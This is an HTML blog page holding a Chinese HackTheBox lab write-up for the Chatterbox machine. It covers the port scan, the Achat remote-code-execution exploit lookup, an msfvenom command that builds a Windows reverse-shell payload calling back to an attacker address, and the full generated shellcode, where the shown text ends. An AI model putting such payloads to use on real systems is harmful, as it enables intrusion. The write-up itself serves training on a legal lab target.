@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Chatterbox - T0x1c</title>
+
+  
+    <meta name="description" content="Chatterbox是一个中等难度的靶机，知识点涉及Achat远程代码执行漏洞、注册表凭证获取、powershell凭证上线等。Achat远程代码执行漏洞能够直接获取权限，使用powerup检查本机配置，借助获取到的凭证上线即可。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Chatterbox">
+<meta property="og:url" content="https://toxic80l.github.io/post/28ba001e/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Chatterbox是一个中等难度的靶机，知识点涉及Achat远程代码执行漏洞、注册表凭证获取、powershell凭证上线等。Achat远程代码执行漏洞能够直接获取权限，使用powerup检查本机配置，借助获取到的凭证上线即可。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0180.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8A%E5%8D%889.52.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8812.08.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.04.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.23.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.26.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.29.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.40.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.41.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%885.02.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.46.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.49.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.54.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.55.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.36.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.31.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.34.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.56.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.57.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.58.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.30.33.png">
+<meta property="article:published_time" content="2022-01-26T02:47:33.000Z">
+<meta property="article:modified_time" content="2022-01-27T03:24:15.830Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0180.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9255%E7%AB%AF%E5%8F%A3"><span class="toc-text">9255端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-alfred"><span class="toc-text">0x02 上线[alfred]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Achat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">Achat远程代码执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E4%B8%8A%E7%BA%BF"><span class="toc-text">修改利用脚本上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%8A%E7%BA%BF-administrator"><span class="toc-text">0x03 上线[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-text">注册表获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">ssh反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%8F%8D%E5%BC%B9"><span class="toc-text">powershell反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#icalas%E8%AF%BB%E5%8F%96root-txt"><span class="toc-text">icalas读取root.txt</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-26T02:47:33.000Z">2022-01-26</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Chatterbox</span></h1>
+<p>Chatterbox是一个中等难度的靶机，知识点涉及Achat远程代码执行漏洞、注册表凭证获取、powershell凭证上线等。Achat远程代码执行漏洞能够直接获取权限，使用powerup检查本机配置，借助获取到的凭证上线即可。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0180.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8A%E5%8D%889.52.52.png" alt="截屏2021-10-18 上午9.52.52"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.74 -oA nmap_Chatterbox</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8812.08.00.png" alt="截屏2021-10-18 下午12.08.00"><br>扫描结果显示开放端口为9255和9256，为Achat chat system</p>
+<h4 id="9255端口"><a href="#9255端口" class="headerlink" title="9255端口"></a>9255端口</h4><p>一般情况下 Achat 的9255端口主要网络监控，而9256端口是未分配的。访问9255端口并未返回有用的页面信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.04.37.png" alt="截屏2021-10-18 下午4.04.37"></p>
+<h2 id="0x02-上线-alfred"><a href="#0x02-上线-alfred" class="headerlink" title="0x02 上线[alfred]"></a>0x02 上线[alfred]</h2><h3 id="Achat远程代码执行漏洞"><a href="#Achat远程代码执行漏洞" class="headerlink" title="Achat远程代码执行漏洞"></a>Achat远程代码执行漏洞</h3><p>使用 searchsploit 寻找相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Achat</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.23.18.png" alt="截屏2021-10-18 下午4.23.18"><br>Achat 0.150 版本存在远程代码执行漏洞，将利用脚本复制到当前目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/windows/remote/36025.py .</span><br></pre></td></tr></table></figure>
+<h3 id="修改利用脚本上线"><a href="#修改利用脚本上线" class="headerlink" title="修改利用脚本上线"></a>修改利用脚本上线</h3><p>查看脚本源码发现示例中使用 shellcode 完成注入，因此我们需要生成一个 shellcode 完成反向连接<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.26.18.png" alt="截屏2021-10-18 下午4.26.18"><br>使用 msfvenom 生成 shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=5555 -e x86/unicode_mixed -b <span class="string">&#x27;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#x27;</span> BufferRegister=EAX -f python</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.29.18.png" alt="截屏2021-10-18 下午4.29.18"><br>生成的 shellcode 如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">buf</span> <span class="string">=</span>  <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x4a\x48\x74\x42&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x69\x70\x6b\x50\x69\x70\x73\x30\x52\x69\x39\x55\x70&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x31\x45\x70\x43\x34\x74\x4b\x32\x30\x50\x30\x72\x6b&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x31\x42\x4a\x6c\x42\x6b\x61\x42\x6b\x64\x54\x4b\x72&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x52\x6f\x38\x4a\x6f\x66\x57\x4e\x6a\x4b\x76\x70\x31&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x79\x6f\x46\x4c\x4d\x6c\x33\x31\x61\x6c\x7a\x62\x6e&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4c\x4f\x30\x69\x31\x66\x6f\x6a\x6d\x49\x71\x66\x67&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x67\x72\x79\x62\x30\x52\x6e\x77\x64\x4b\x32\x32\x4a&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x70\x74\x4b\x6f\x5a\x6f\x4c\x32\x6b\x4e\x6c\x4e\x31&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x54\x38\x38\x63\x6f\x58\x59\x71\x46\x71\x72\x31\x74&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4b\x6f\x69\x6b\x70\x6a\x61\x4a\x33\x62\x6b\x4d\x79&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4b\x68\x38\x63\x6c\x7a\x6e\x69\x42\x6b\x4e\x54\x32&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6b\x5a\x61\x46\x76\x4d\x61\x4b\x4f\x64\x6c\x39\x31&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x58\x4f\x6c\x4d\x4d\x31\x76\x67\x4c\x78\x37\x70\x71&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x65\x6c\x36\x6a\x63\x31\x6d\x4b\x48\x4d\x6b\x33\x4d&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6d\x54\x73\x45\x77\x74\x61\x48\x54\x4b\x6f\x68\x4f&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x34\x6b\x51\x49\x43\x63\x36\x52\x6b\x4c\x4c\x6e\x6b&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x42\x6b\x71\x48\x4d\x4c\x79\x71\x57\x63\x52\x6b\x6b&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x54\x52\x6b\x4a\x61\x7a\x30\x75\x39\x4f\x54\x4d\x54&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6c\x64\x31\x4b\x61\x4b\x71\x51\x70\x59\x6f\x6a\x6e&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x71\x49\x6f\x79\x50\x31\x4f\x61\x4f\x31\x4a\x74\x4b&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x7a\x72\x4a\x4b\x54\x4d\x61\x4d\x53\x38\x6e\x53\x6d&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x62\x79\x70\x69\x70\x73\x38\x31\x67\x53\x43\x70\x32&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x61\x4f\x31\x44\x53\x38\x50\x4c\x52\x57\x4e\x46\x59&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x77\x6b\x4f\x68\x55\x77\x48\x72\x70\x6d\x31\x4b\x50&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4b\x50\x4d\x59\x45\x74\x4f\x64\x6e\x70\x63\x38\x4c&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x69\x55\x30\x72\x4b\x39\x70\x49\x6f\x6a\x35\x30\x50&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6e\x70\x42\x30\x50\x50\x61\x30\x30\x50\x4d\x70\x30&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x50\x62\x48\x69\x5a\x6a\x6f\x67\x6f\x59\x50\x4b\x4f&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x78\x55\x64\x57\x6f\x7a\x6a\x65\x53\x38\x7a\x6a\x59&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x7a\x7a\x6e\x4d\x33\x62\x48\x4a\x62\x49\x70\x6c\x55&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x48\x33\x35\x39\x59\x56\x52\x4a\x4a\x70\x42\x36\x71&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x47\x52\x48\x75\x49\x76\x45\x70\x74\x31\x51\x6b\x4f&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6a\x35\x75\x35\x77\x50\x33\x44\x5a\x6c\x39\x6f\x30&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4e\x6d\x38\x71\x65\x58\x6c\x73\x38\x7a\x50\x45\x65&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x37\x32\x6e\x76\x49\x6f\x76\x75\x71\x58\x50\x63\x52&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x4d\x42\x44\x79\x70\x64\x49\x77\x73\x62\x37\x70\x57&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x32\x37\x4e\x51\x58\x76\x4f\x7a\x4e\x32\x50\x59\x61&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x46\x58\x62\x79\x6d\x43\x36\x75\x77\x4e\x64\x4d\x54&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6d\x6c\x4a\x61\x7a\x61\x34\x4d\x6f\x54\x6c\x64\x7a&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x70\x79\x36\x6b\x50\x70\x44\x61\x44\x50\x50\x42\x36&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x50\x56\x6e\x76\x31\x36\x50\x56\x30\x4e\x61\x46\x51&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x46\x4e\x73\x71\x46\x30\x68\x70\x79\x78\x4c\x4f\x4f&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x33\x56\x69\x6f\x7a\x35\x65\x39\x39\x50\x30\x4e\x42&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x36\x4f\x56\x39\x6f\x70\x30\x43\x38\x5a\x68\x64\x47&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x6d\x4d\x43\x30\x6b\x4f\x7a\x35\x37\x4b\x6a\x50\x37&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x45\x53\x72\x51\x46\x52\x48\x75\x56\x74\x55\x37\x4d&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x75\x4d\x79\x6f\x46\x75\x6f\x4c\x69\x76\x73\x4c\x69&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x7a\x51\x70\x4b\x4b\x47\x70\x31\x65\x6a\x65\x47\x4b&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x50\x47\x4c\x53\x74\x32\x72\x4f\x52\x4a\x6d\x30\x72&quot;</span></span><br><span class="line"><span class="string">buf</span> <span class="string">+=</span> <span class="string">b&quot;\x33\x6b\x4f\x48\x55\x41\x41&quot;</span></span><br></pre></td></tr></table></figure>
